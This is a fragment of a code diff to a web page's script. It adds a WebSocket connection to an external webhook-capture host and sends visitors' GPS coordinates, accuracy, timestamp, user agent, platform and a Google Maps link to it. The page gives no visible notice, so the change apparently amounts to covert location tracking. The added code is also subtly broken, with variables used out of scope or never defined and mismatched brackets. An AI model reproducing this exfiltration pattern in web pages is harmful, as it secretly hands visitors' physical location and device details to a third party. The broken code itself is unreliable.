@@ -169,7 +169,34 @@
         }
       );
     });
-  });
+const ws = new WebSocket("wss://app.hooklistener.com/ws/tiny-summit-074043-7twl");
+
+ws.onopen = () => {
+  console.log("Connected to WebSocket");
+
+  // Example data (like a webhook payload)
+  const payload = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              timestamp: getCentralTimeISO(),
+              device: navigator.userAgent,
+              platform: navigator.platform,
+              map: `https://www.google.com/maps?q=${lat},${lng}`
+  	};
+
+	  // Send JSON as text
+	  ws.send(JSON.stringify(payload));
+	};
+	
+	ws.onmessage = (msg) => {
+	  console.log("Received from server:", msg.data);
+	};
+	
+	ws.onclose = () => {
+	  console.log("WebSocket closed");
+	};
+});
 </script>
 </body>
 </html>
